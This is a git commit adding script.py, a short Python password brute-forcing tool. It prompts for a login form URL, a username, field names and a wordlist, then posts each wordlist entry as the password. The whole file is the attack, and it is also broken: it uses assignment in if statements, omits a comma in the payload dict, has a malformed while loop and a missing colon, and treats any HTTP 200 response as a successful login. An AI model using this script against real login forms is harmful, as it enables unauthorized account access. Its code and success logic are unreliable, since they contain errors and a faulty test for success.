8495d21dfa9e575ce720073804839293415c6e89
hawwky <79000630+hawwky@users.noreply.github.com>
2021-03-03 10:23:20 +0530

    Add files via upload

---
+++ script.py
@@ -0,0 +1,26 @@
+import requests 
+
+url = input("What is the web-address of the login form: ")
+uname = input("What is the username: ")
+uname_field = input("What is the name of username field: ")
+pass_field = input("What is the name of password field: ")
+wordlist = input("What is the location of the wordlist: ")
+
+if uname_field = "":
+    uname_field = "username"
+
+if pass_field = "":
+     pass_field = "password"
+
+
+passw = open(str(wordlist),"r")
+while passw in passw:
+    payload = {
+
+        uname_field: uname
+        pass_field: passw
+    }
+
+    r = requests.post(url, data=payload)
+    if r.status_code == 200
+        print(str(uname)+":"+str(passw)+" was successful!")
